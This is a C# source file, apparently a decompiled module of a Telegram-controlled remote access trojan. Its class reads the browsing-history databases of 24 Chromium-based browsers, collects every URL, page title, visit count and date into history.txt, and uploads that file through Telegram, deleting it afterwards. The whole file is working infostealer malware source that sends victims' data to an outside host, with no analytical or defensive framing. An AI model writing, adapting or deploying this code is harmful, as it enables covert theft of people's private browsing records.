using System;
using System.IO;

namespace TelegramRAT;

internal class History
{
	public static void get()
	{
		AutoStealer.loadDlls();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		string text3 = "\\User Data\\Default\\History";
		string[] obj = new string[24]
		{
			text2 + "Google\\Chrome" + text3,
			text2 + "Google(x86)\\Chrome" + text3,
			text2 + "Chromium" + text3,
			text + "Opera Software\\Opera Stable\\History",
			text2 + "BraveSoftware\\Brave-Browser" + text3,
			text2 + "Epic Privacy Browser" + text3,
			text2 + "Amigo" + text3,
			text2 + "Vivaldi" + text3,
			text2 + "Orbitum" + text3,
			text2 + "Mail.Ru\\Atom" + text3,
			text2 + "Kometa" + text3,
			text2 + "Comodo\\Dragon" + text3,
			text2 + "Torch" + text3,
			text2 + "Comodo" + text3,
			text2 + "Slimjet" + text3,
			text2 + "360Browser\\Browser" + text3,
			text2 + "Maxthon3" + text3,
			text2 + "K-Melon" + text3,
			text2 + "Sputnik\\Sputnik" + text3,
			text2 + "Nichrome" + text3,
			text2 + "CocCoc\\Browser" + text3,
			text2 + "uCozMedia\\Uran" + text3,
			text2 + "Chromodo" + text3,
			text2 + "Yandex\\YandexBrowser" + text3
		};
		string text4 = "";
		string text5 = "history.txt";
		string text6 = "[HISTORY]\n\n";
		string[] array = obj;
		foreach (string text7 in array)
		{
			if (!File.Exists(text7))
			{
				continue;
			}
			text4 = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			File.Copy(text7, text4);
			cSQLite cSQLite2 = new cSQLite(text4);
			cSQLite2.ReadTable("urls");
			for (int j = 0; j < cSQLite2.GetRowCount(); j++)
			{
				string text8 = Convert.ToString(cSQLite2.GetValue(j, 1));
				string text9 = Convert.ToString(cSQLite2.GetValue(j, 2));
				string text10 = Convert.ToString(Convert.ToInt32(cSQLite2.GetValue(j, 3)) + 1);
				string text11 = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64(cSQLite2.GetValue(j, 5))), TimeZoneInfo.Local));
				if (string.IsNullOrEmpty(text8))
				{
					break;
				}
				text6 = text6 + "URL: " + text8 + "\nTITLE: " + Crypt.toUTF8(text9) + "\nVISITS: " + text10 + "\nDATE: " + text11 + "\n\n";
			}
		}
		File.WriteAllText(text5, text6);
		telegram.UploadFile(text5, removeAfterUpload: true);
	}
}
